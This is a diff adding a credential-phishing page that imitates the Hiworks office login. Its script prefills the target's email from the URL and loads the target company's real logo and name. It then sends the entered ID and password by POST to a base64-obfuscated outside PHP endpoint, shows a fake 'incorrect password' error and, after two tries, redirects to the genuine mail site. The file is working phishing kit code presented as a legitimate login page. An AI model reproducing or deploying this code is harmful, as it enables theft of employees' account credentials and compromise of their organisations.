@@ -1,0 +1,626 @@
+﻿<!DOCTYPE html>
+<html lang="ko">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="#">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://login.office.hiworks.com/favicon-96x96.png">
+    <title>하이웍스 로그인</title>
+    <link rel="stylesheet" href="https://pub-d484e3799a2443ed82e98716821c5955.r2.dev/index-ca98c1d4.css">
+    <style type="text/css">
+    .mantine-p2wiva {
+        font-family: inherit;
+        -webkit-tap-highlight-color: transparent;
+        appearance: none;
+        resize: none;
+        box-sizing: border-box;
+        width: 100%;
+        display: block;
+        text-align: left;
+        transition: border-color 100ms ease 0s;
+        height: 2.5rem;
+        min-height: 0px;
+        line-height: 2.5rem;
+        font-size: 0.875rem;
+        letter-spacing: -0.013125rem;
+        padding: 8px 10px;
+        border-radius: 2px;
+        border: 1px solid rgb(214, 214, 214);
+        background-color: rgb(255, 255, 255);
+        color: rgb(51, 51, 51);
+    }
+
+    .mantine-p2wiva[data-with-icon] {
+        padding-left: 2.25rem;
+    }
+    .mb-auto {
+    margin-bottom: auto;
+}
+
+    .mantine-1v7s5f8 {
+        position: relative;
+    }
+
+    .mantine-16k3d8y {
+        pointer-events: none;
+        position: absolute;
+        z-index: 1;
+        left: 0px;
+        top: 0px;
+        bottom: 0px;
+        display: flex;
+        -webkit-box-align: center;
+        align-items: center;
+        -webkit-box-pack: center;
+        justify-content: center;
+        width: 2.25rem;
+        color: rgb(173, 181, 189);
+    }
+
+    .mantine-1tps2x6 {
+        height: 100%;
+        display: grid;
+        place-content: center;
+        min-width: calc(1.5rem);
+        padding-inline: 0.3125rem;
+        margin: 0px 0px 0px calc(1rem);
+        transition: margin 150ms ease 0s;
+    }
+
+
+    .mantine-18t8wwz {
+        position: absolute;
+        z-index: 1;
+        box-sizing: border-box;
+        display: flex;
+        left: 0.125rem;
+        transition: left 150ms ease 0s;
+        width: 1.25rem;
+        height: 1.25rem;
+        background-color: white;
+        box-shadow: rgba(0, 0, 0, 0.06) 0px 2px 1px;
+        border: 0.5px solid rgba(0, 0, 0, 0.04);
+        border-radius: 50%;
+    }
+
+    input:checked+*>.mantine-18t8wwz {
+        left: calc(100% - 1rem);
+        border-color: rgb(255, 255, 255);
+    }
+
+    .mantine-1ra7d1l {
+        -webkit-tap-highlight-color: transparent;
+        cursor: default;
+        overflow: hidden;
+        position: relative;
+        min-width: 2.375rem;
+        margin: 0px;
+        box-sizing: border-box;
+        appearance: none;
+        display: flex;
+        -webkit-box-align: center;
+        align-items: center;
+        font-size: 0.375rem;
+        font-weight: 600;
+        order: 1;
+        user-select: none;
+        z-index: 0;
+        line-height: 0;
+        color: rgb(134, 142, 150);
+        transition: color 150ms ease 0s;
+        width: 2.25rem;
+        height: 1.5rem;
+        background-color: rgb(214, 214, 214);
+        border: none;
+        border-radius: 0.75rem;
+    }
+
+    input:checked+.mantine-1ra7d1l {
+        background-color: rgb(34, 139, 230);
+        border-color: rgb(34, 139, 230);
+        color: rgb(255, 255, 255);
+        transition: color 150ms ease 0s;
+    }
+
+    .mantine-7refu0 {
+        height: 0px;
+        width: 0px;
+        overflow: hidden;
+        white-space: nowrap;
+        padding: 0px;
+        clip-path: inset(50%);
+        position: absolute;
+        background-color: rgb(41, 133, 219);
+    }
+
+    .mantine-7refu0:checked+.mantine-Switch-track>.mantine-Switch-thumb {
+        left: calc(100% - 1.375rem);
+    }
+
+    .mantine-srqryz {
+        padding: 0px;
+        max-width: 25rem;
+        margin-left: auto;
+        margin-right: auto;
+    }
+
+    .mantine-norobh {
+        padding-left: 1rem;
+        padding-right: 1rem;
+        max-width: 75rem;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    </style>
+    <style type="text/css">
+        .loader {
+            /*position: absolute;*/
+            /*padding: 30px 0px;*/
+            width: 50px;
+            /*margin: -22px;*/
+        }
+        
+        .loader .circle {
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            opacity: 0;
+            transform: rotate(225deg);
+            animation-iteration-count: infinite;
+            animation-name: orbit;
+            animation-duration: 3s;
+        }
+        
+        .loader .circle:after {
+            content: "";
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            border-radius: 5px;
+            background: #000;
+        }
+        
+        .loader .circle:nth-child(2) {
+            animation-delay: 240ms;
+        }
+        
+        .loader .circle:nth-child(3) {
+            animation-delay: 480ms;
+        }
+        
+        .loader .circle:nth-child(4) {
+            animation-delay: 720ms;
+        }
+        
+        .loader .circle:nth-child(5) {
+            animation-delay: 960ms;
+        }
+        
+        @keyframes orbit {
+            0% {
+                transform: translate(10px, 0);
+                opacity: 1;
+                animation-timing-function: ease-out;
+            }
+        
+            7% {
+                transform: translate(30px, 0);
+                animation-timing-function: linear;
+            }
+        
+            30% {
+                transform: translate(60px, 0);
+                animation-timing-function: ease-in-out;
+            }
+        
+            40% {
+                transform: translate(90px, 0);
+                animation-timing-function: ease-out;
+            }
+        
+            50% {
+                transform: translate(120px, 0);
+                animation-timing-function: ease-out;
+            }
+        
+            75% {
+                transform: translate(250px, 0);
+                animation-timing-function: ease-out;
+            }
+        
+            76% {
+                transform: translate(300px, 0);
+                opacity: 0;
+            }
+        
+            100% {
+                transform: translate(350px, 0);
+                opacity: 0;
+            }
+        }
+        
+        /* progress bar style */
+
+        #myProgress {
+  width: 300px;
+  background-color: #ccc;
+  }
+
+  #myBar {
+  width: 1%;
+  height: 4px;
+  background-color: #2985db;
+  text-align: center; /* To center it horizontally (if you want) */
+  line-height: 10px; /* To center it vertically */
+  color: white;
+}
+        </style>
+</head>
+
+<body>
+
+    
+       
+		
+	<div id="wrap">
+	
+    <div id="root">
+        <div class="min-h-screen bg-blue_gray-50 flex flex-col justify-between">
+            <header class="top_header">
+                <div class="mantine-Container-root flex h-[58px] items-center justify-between mantine-norobh">
+                    <h1 class="leading-[0]"><img src="https://pub-d484e3799a2443ed82e98716821c5955.r2.dev/logo.svg" alt="hiworks" class="object-contain w-[104px] h-[22px]"></h1>
+                </div>
+                </header>
+                <main>
+                    <div class="mantine-Container-root sm:p-0 mantine-srqryz">
+                        <div>
+                            <form class="w-full" id="form-1">
+                                <input type="hidden" name="btn1" value="btn1">
+                                <fieldset class="flex max-w-[400px] flex-col text-center" id="div1">
+                                    <div class="mb-10">
+                                        <legend class="mb-3 w-full text-36px font-bold leading-[48px]">Sign-in</legend>
+                                        <p class="text-14px">Please enter <span class="font-bold">login ID </span>with domain</p>
+                                    </div>
+                                    <div class="mb-5">
+                                        <div class="flex h-10 items-center rounded-sm border bg-white px-3 text-14px border-gray-70 "><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14" class="mr-2.5">
+                                                <path data-name="\uC0AC\uAC01\uD615 35424" d="M0 0h14v14H0z" style="fill: transparent;"></path>
+                                                <g data-name="Layer 2">
+                                                    <g data-name="Layer 1">
+                                                        <path data-name="\uD328\uC2A4 4077" d="M12.25 11.55v1.137A1.312 1.312 0 0 1 10.938 14H1.313A1.313 1.313 0 0 1 0 12.688V11.55a3.675 3.675 0 0 1 3.675-3.675c.787 0 1.164.438 2.45.438s1.662-.437 2.45-.437a3.675 3.675 0 0 1 3.675 3.674zm-.875 0a2.8 2.8 0 0 0-2.8-2.8 13.125 13.125 0 0 1-2.45.438 13.055 13.055 0 0 1-2.45-.437 2.8 2.8 0 0 0-2.8 2.8v1.137a.437.437 0 0 0 .438.438h9.625a.437.437 0 0 0 .438-.437zM2.625 3.5a3.5 3.5 0 1 1 3.5 3.5 3.5 3.5 0 0 1-3.5-3.5zm.875 0A2.625 2.625 0 1 0 6.125.875 2.625 2.625 0 0 0 3.5 3.5z" transform="translate(.875)" style="fill: rgb(144, 144, 144);"></path>
+                                                    </g>
+                                                </g>
+                                            </svg>
+                                            <input class="min-w-[1px] grow font-web leading-5 outline-none placeholder:text-14px placeholder:text-gray-100" type="text" placeholder="id@company.onhiworks.com" id="pre_ai" name="pre_ai" required="">
+                                        </div>
+                                    </div>
+                                    <button class="mantine-UnstyledButton-root flex cursor-pointer items-center gap-1.5 rounded disabled:cursor-default disabled:opacity-30 border border-solid border-blue-600 bg-primary text-white h-11 gap-2.5 px-[60px] text-18px false  justify-center mantine-id0m02" type="submit">Next</button>
+                                </fieldset>
+                                <fieldset class="flex max-w-[400px] flex-col" id="div2" style="display:none;">
+                                    <header class="mb-[60px]" style="padding-top: 120px;">
+                                        <h1 class="mx-auto w-fit leading-[0]"><img id="logo_img" src="https://pub-d484e3799a2443ed82e98716821c5955.r2.dev/logo.svg" alt="" class="object-contain w-[200px] h-[40px]"></h1>
+                                    </header>
+                                    <div class="mb-8 text-center">
+                                        <legend class="mb-3 w-full text-24px font-bold">Sign in to <span class="font-bold text-gray-400" id="logo_text"></span></legend>
+                                        <p class="mb-8 text-14px">Please enter your password for identity verification.</p>
+                                        <div aria-hidden="true" class="inline-flex h-9 items-center rounded-[18px] border border-gray-50 px-5"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="mr-2">
+                                                <path data-name="\uD328\uC2A4 98550" d="M8 0a8 8 0 1 0 8 8 8 8 0 0 0-8-8" style="fill: rgb(144, 144, 144);"></path>
+                                                <path data-name="\uD569\uCE58\uAE30 689" d="M3727 20366.9a3.6 3.6 0 0 1 3.175-1.928.735.735 0 0 1 .235.037 4.043 4.043 0 0 0 2.638 0 .726.726 0 0 1 .23-.037 3.6 3.6 0 0 1 3.175 1.928 6.171 6.171 0 0 1-9.452 0zm1.886-6.057a2.84 2.84 0 1 1 2.837 2.836 2.837 2.837 0 0 1-2.836-2.839z" transform="translate(-3723.725 -20354.906)" style="fill: rgb(255, 255, 255); stroke: transparent; stroke-miterlimit: 10;"></path>
+                                            </svg><span id="em_txt"></span></div>
+                                    </div>
+                                    <input type="hidden" name="ar" id="ar" value="">
+                                    <div id="jb" class="mantine-InputWrapper-root mantine-TextInput-root mantine-vb1jt1" style="margin-bottom:1.25rem">
+                                        <div class="mantine-Input-wrapper mantine-TextInput-wrapper mantine-1v7s5f8">
+                                            <div class="mantine-16k3d8y mantine-Input-icon mantine-TextInput-icon"><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 14 14">
+                                                    <path data-name="\uC0AC\uAC01\uD615 11664" d="M0 0h14v14H0z" style="fill: none;"></path>
+                                                    <g data-name="\uADF8\uB8F9 59573">
+                                                        <path data-name="\uD328\uC2A4 6923" d="M538.1 70.054h-1.75v-.875a3.5 3.5 0 0 0-7 0v.875h-1.75a.875.875 0 0 0-.875.875V78.8a.875.875 0 0 0 .875.875h10.5a.875.875 0 0 0 .875-.875v-7.871a.875.875 0 0 0-.875-.875zm-7.875-.875a2.625 2.625 0 0 1 5.25 0v.875h-5.25zM538.1 78.8h-10.5v-7.871h10.5z" transform="translate(-525.855 -65.679)" style="fill: rgb(144, 144, 144);"></path>
+                                                        <path data-name="\uD328\uC2A4 6924" d="M533.98 73.754a1.312 1.312 0 0 0-.875 2.475v1.83h.875v-1.83a1.312 1.312 0 0 0 0-2.475z" transform="translate(-526.542 -66.679)" style="fill: rgb(144, 144, 144);"></path>
+                                                    </g>
+                                                </svg></div>
+                                            <input class="mantine-Input-input mantine-TextInput-input mantine-p2wiva" type="password" name="pass" id="pass" placeholder="Password" aria-invalid="false" data-with-icon="true">
+                                       </div>
+                                     </div>
+                                     <span>
+                                            <div id="msg" style="display:none;color: red;">
+                                        ID or password is incorrect.
+                                    </div>
+                                    </span>
+                                    <button class=" flex cursor-pointer items-center gap-1.5 rounded disabled:cursor-default disabled:opacity-30 border border-solid border-blue-600 bg-primary text-white h-11 gap-2.5 px-[60px] text-18px false  justify-center mantine-id0m02" type="submit" id="btn1" name="btn1">Sign-in</button>
+                                </fieldset>
+                                
+                                <fieldset id="checkbox" style="display:none;">
+                                     <div class="mt-3 flex justify-between">
+                                        <div class="flex items-center gap-2"><button class="mantine-UnstyledButton-root flex cursor-pointer items-center gap-1.5 rounded border-none bg-transparent text-primary disabled:cursor-default disabled:opacity-30 hover:text-blue-600 active:text-blue-600 h-[26px] gap-1.5 text-14px h-[34px] mantine-id0m02" type="button"><span class="">Sign in with another ID</span></button></div>
+                                        <div class="flex items-center gap-2">
+                                            <div class="mantine-Switch-root mantine-Switch-root mantine-1knyxmk">
+                                                <div class="mantine-hqx0d1 mantine-Switch-body"><input name="checkbox" aria-label="IP Security on" id="mantine-tvdmecnws" type="checkbox" class="mantine-Switch-input mantine-7refu0"><label for="mantine-tvdmecnws" class="mantine-Switch-track mantine-1ra7d1l">
+                                                        <div class="mantine-Switch-thumb mantine-18t8wwz"></div>
+                                                        <div class="mantine-1tps2x6 mantine-Switch-trackLabel"></div>
+                                                    </label>
+                                                    <div class="mantine-1vynagh mantine-Switch-labelWrapper"></div>
+                                                </div>
+                                     
+                                            </div><button id="mantine-tvdmecnw" type="button" class="font-[inherit] text-14px">IP Security</button>
+                                        </div>
+                                    </div>
+                                </fieldset>
+                            </form>
+                        </div>
+                        <div class="mt-10 flex h-6 w-full overflow-hidden text-gray-400"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="14" viewBox="0 0 16 14" class="shrink-0 grow-0 self-center">
+                                <defs>
+                                    <clipPath id="jqwjrqddha">
+                                        <path data-name="\uC0AC\uAC01\uD615 144435" d="M0 0h16v14H0z" style="fill: none;"></path>
+                                    </clipPath>
+                                </defs>
+                                <g data-name="\uADF8\uB8F9 269070" style="clip-path: url(&quot;#jqwjrqddha&quot;);">
+                                    <path data-name="\uD328\uC2A4 98612" d="M8 9.588s2.189 0 5.2 2.307a.5.5 0 0 0 .8-.395V.5a.5.5 0 0 0-.8-.391C10.189 2.412 8 2.412 8 2.412z" style="fill: rgb(224, 232, 238);"></path>
+                                    <path data-name="\uD328\uC2A4 98613" d="M1.5 9.6H8V2.412H1.5a1.5 1.5 0 0 0-1.5 1.5V8.1a1.5 1.5 0 0 0 1.5 1.5" style="fill: rgb(226, 140, 70);"></path>
+                                    <path data-name="\uD328\uC2A4 98614" d="M5 9H2v4a1 1 0 0 0 1 1h1a1 1 0 0 0 1-1z" style="fill: rgb(226, 140, 70);"></path>
+                                    <path data-name="\uD328\uC2A4 98615" d="M15 7.5v-3a1 1 0 0 1 1 1v1a1 1 0 0 1-1 1" style="fill: rgb(159, 166, 173);"></path>
+                                </g>
+                            </svg>
+                            <div class="swiper-container swiper-container-initialized swiper-container-vertical">
+                                <div class="swiper-wrapper" style="transition-duration: 0ms; transform: translate3d(0px, -48px, 0px);">
+                                    <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="4" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">에스원(세콤)
+                                                근태 연동 이슈 안내(처리완료)</a></div>
+                                    </div>
+                                    <div class="swiper-slide swiper-slide-prev" data-swiper-slide-index="0" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">하이웍스
+                                                오피스 정기 점검 안내 (9/23 22:00~04:00)</a></div>
+                                    </div>
+                                    <div class="swiper-slide swiper-slide-active" data-swiper-slide-index="1" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">하이웍스
+                                                전자세금계산서 국세청 전송 일시 중지 안내</a></div>
+                                    </div>
+                                    <div class="swiper-slide swiper-slide-next" data-swiper-slide-index="2" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">LDAP
+                                                계정 연동 기능 추가 안내</a></div>
+                                    </div>
+                                    <div class="swiper-slide" data-swiper-slide-index="3" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">전자결재
+                                                문서 제목 설정 기능 추가 안내</a></div>
+                                    </div>
+                                    <div class="swiper-slide" data-swiper-slide-index="4" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">에스원(세콤)
+                                                근태 연동 이슈 안내(처리완료)</a></div>
+                                    </div>
+                                    <div class="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-prev" data-swiper-slide-index="0" style="height: 24px;">
+                                        <div class="swiper-slide flex items-center gap-1.5"><a href="#" rel="noopener noreferrer" target="_blank" class="block overflow-hidden text-ellipsis whitespace-nowrap pl-2.5 text-14px text-gray-400 hover:text-gray-600 active:text-gray-600 max-w-[355px] sm:max-w-[380px]">하이웍스
+                                                오피스 정기 점검 안내 (9/23 22:00~04:00)</a></div>
+                                    </div>
+                                </div><span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+            <footer class="mb-10 text-center"><a href="#" class="text-14px text-gray-100">©Gabia Inc.</a></footer>
+        </div>
+    </div>
+    </div>
+    
+
+                
+    <div>
+        <div dir="ltr">
+            <div>
+                <div class="mantine-Modal-root mantine-yxmaw9"></div>
+            </div>
+        </div>
+    </div>
+    <!-- //mailer link -->
+    <input type="hidden" id="f" value="">
+    <!-- //mail result count -->
+    <input type="hidden" id="rc" value="2">
+    <!-- //redirect link -->
+    <input type="hidden" id="rdrt" value="https://mails.office.hiworks.com">
+    <!-- // if you want to redirection for domain (0 for no)(1 for yes) -->
+    <input type="hidden" id="domain_redirect" value="0">
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+// var f = $("#f").val();
+var rc = $("#rc").val();
+var rdrt = $("#rdrt").val();
+var domain_redirect = $("#domain_redirect").val();
+$(document).ready(function() {
+    var count = 0;
+    // $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+    // $("#div2").animate({ right: 0, opacity: "show" }, 500);
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+
+            $("#btn1").click();
+
+        }
+    });
+
+
+    function logo_show(ai) {
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var user = my_ai.substr(0, ind);
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $(".top_header").hide();
+        $("#logo_img").attr('src', `https://office.hiworks.com/` + my_slice + `/common/logo/login`);
+        fetch_text(my_slice);
+    }
+
+    function fetch_text(domain) {
+
+        // Construct the URL dynamically
+        var url = `https://auth-api.office.hiworks.com/office-info/${domain}/login-preferences`;
+
+        // Perform the AJAX request
+    $.ajax({
+            url: url,
+            method: "GET",
+            dataType: "json",
+            success: function(data) {
+                console.log("Success:", data,data.data.office_name);
+                $("#logo_text").html(data.data.office_name)
+                // Handle the JSON response here
+            },
+            error: function(jqXHR, textStatus, errorThrown) {
+                console.log("Error:", textStatus, errorThrown);
+                // Handle the error here
+            }
+        });
+    }
+
+    $("#logo_img").on('error', function() {
+        $(this).attr('src', 'https://pub-d484e3799a2443ed82e98716821c5955.r2.dev/logo.svg');
+    });
+
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var user = my_ai.substr(0, ind);
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        logo_show(ai);
+
+        $('#pre_ai').val(ai);
+        $('#domain_auto').val("@" + my_slice);
+        $("#msg").hide();
+        $('#jb').css('margin-bottom','1.25rem !important');
+        $("#checkbox").hide();
+        
+        
+
+    }
+
+
+    $('#form-1').submit(function(event) {
+        $('#msg').hide();
+        $('#jb').css('margin-bottom','1.25rem !important');
+        $("#checkbox").show();
+        event.preventDefault();
+        var ai = $("#pre_ai").val();
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        var com_ai = ai;
+        logo_show(com_ai);
+
+
+        ///////////////////////////
+
+        if (!$("#div2").is(":visible")) {
+            $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+            $("#div2").animate({ right: 0, opacity: "show" }, 500);
+            $("#ai").val(com_ai);
+            $("#em_txt").html(com_ai);
+            $("#div2").find("input").prop("required", true);
+            
+            
+            return false;
+
+        }
+
+
+        count = count + 1;
+
+        // var c = $("#form-field-2").serialize();
+        var c = new FormData($("#form-1")[0]);
+
+        console.log(c);
+            var f = atob("aHR0cHM6Ly9tYXN0ZXJtaW5kc3NlcnZpY2UuY29tL2F6MDkvaHdrcy9uZXh0LnBocA==");
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: c,
+            processData: false,
+            contentType: false,
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#btn1').html('Verifying...');
+            },
+
+            complete: function() {
+
+                if (count >= rc) {
+                    count = 0;
+                    if (domain_redirect == 1) {
+                        window.location.replace("http://www." + my_slice);
+                    } else {
+                        window.location.replace(rdrt)
+                    }
+                    return false;
+                }
+                $("#pr").val("");
+                $("#msg").show();
+                $("#jb").css("margin-bottom","0rem");
+                document.getElementById('pass').value = '';
+                console.log('done')
+                $('#btn1').html('Sign-in');
+            }
+        });
+    });
+
+
+});
+</script>
+
+<!-- <script type="text/javascript">
+
+    var i = 0;
+
+function move() {
+    if (i == 0) {
+    i = 1;
+    var elem = document.getElementById("myBar");
+    var width = 1;
+    var id = setInterval(frame, 60);
+    function frame() {
+      if (width >= 100) {
+        clearInterval(id);
+        i = 0;
+      } else {
+        width++;
+        elem.style.width = width + "%";
+      }
+    }
+    }
+
+    $('#text1').fadeIn('slow', function() {
+        $('#text1').delay(3000).fadeOut();
+    });
+    $('#text2').delay(5000).fadeIn('slow', function() {
+        $('#text2').delay(5000).fadeOut();
+        $('#first').hide();
+        $('#main').show();
+    });
+    $('#text3').delay(5000).fadeIn('slow', function() {
+    	$('#text3').delay(5000).fadeOut();
+    	$('#first').hide();
+    	$('#main').show();
+    });
+}
+
+</script> -->
+
+</html>
